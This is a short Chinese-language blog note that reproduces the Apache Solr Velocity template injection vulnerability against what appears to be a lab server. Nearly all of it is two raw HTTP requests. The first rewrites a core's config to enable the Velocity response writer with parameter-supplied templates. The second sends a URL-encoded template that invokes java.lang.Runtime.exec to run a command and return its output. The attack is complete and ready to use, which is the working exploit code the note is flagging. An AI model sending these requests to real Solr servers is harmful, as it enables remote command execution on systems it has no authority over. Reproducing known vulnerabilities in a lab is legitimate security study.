---
title: Apache_Solr_Velocity_模板注入漏洞复现
date: 2025-11-12 13:25:19
updated: 2025-11-12 13:30:29
tags:
  - Web
  - java
  - day
---
[Apache Solr Velocity 模板注入漏洞深度分析](https://paper.seebug.org/1107/#1)[Apache Solr Velocity 模板注入漏洞深度分析 (2025_11_12 21：28：06).txt](https://www.yuque.com/attachments/yuque/0/2025/txt/39170111/1762954139526-f8c2d4eb-aa80-4ffa-9c2c-41c25c9ca5ed.txt)

1.  使用burp Repeater模块像服务端发包修改指定集合的配置

```java
POST /solr/new_core/config HTTP/1.1
Host: 10.211.55.5:9002
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
Connection: close
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762954056731-4dc25d10-07ca-4dcb-9fbe-b24d65209342.png)

2.  然后发送事先构造好的payload

```java
GET /solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: 10.211.55.5:9002
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762954070200-48e6b113-086b-41da-b4c0-a3f9be600772.png)